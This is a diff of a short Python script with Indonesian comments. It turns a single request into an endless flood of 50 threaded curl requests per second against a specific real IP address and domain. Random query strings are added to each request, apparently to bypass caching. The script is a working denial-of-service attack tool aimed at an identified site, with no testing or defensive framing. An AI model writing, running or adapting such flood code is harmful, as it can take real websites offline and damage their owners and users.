@@ -1,28 +1,44 @@
-import requests
+import subprocess
+import threading
+import time
 import random
 import string
 
 def random_string(length=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-# IP target langsung
-ip_url = "http://153.92.9.237"
-domain_name = "bisnisia.id"
+def run_curl(index):
+    rand = random_string()
+    url = f"http://153.92.9.237/?s={rand}"
+    cmd = [
+        "curl",
+        "-s",
+        "-L",
+        "-H", "Host: bisinisia.id",
+        url
+    ]
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        print(f"[{index}] Status: {result.returncode}")
+    except Exception as e:
+        print(f"[{index}] Error: {e}")
 
-# Tambahkan query string acak seperti `?s=abc123`
-url = f"{ip_url}/?s={random_string()}"
+def run_50_curl_per_second():
+    counter = 0
+    while True:
+        threads = []
+        start = time.time()
+        for i in range(50):
+            counter += 1
+            t = threading.Thread(target=run_curl, args=(counter,))
+            t.start()
+            threads.append(t)
+        # Tunggu semua selesai
+        for t in threads:
+            t.join()
+        elapsed = time.time() - start
+        sleep_time = max(0, 1 - elapsed)
+        time.sleep(sleep_time)  # Jaga agar tepat 1 detik per batch
 
-# Header disesuaikan agar mirip curl
-headers = {
-    "Host": domain_name,
-    "User-Agent": "curl/8.5.0",  # Versi bisa disesuaikan
-    "Accept": "*/*",
-    "Connection": "close"
-}
-
-try:
-    response = requests.get(url, headers=headers, allow_redirects=True, timeout=10)
-    print(f"Status: {response.status_code}")
-    print(response.text[:500])  # Menampilkan sebagian respon HTML
-except requests.RequestException as e:
-    print(f"Request failed: {e}")
+if __name__ == "__main__":
+    run_50_curl_per_second()
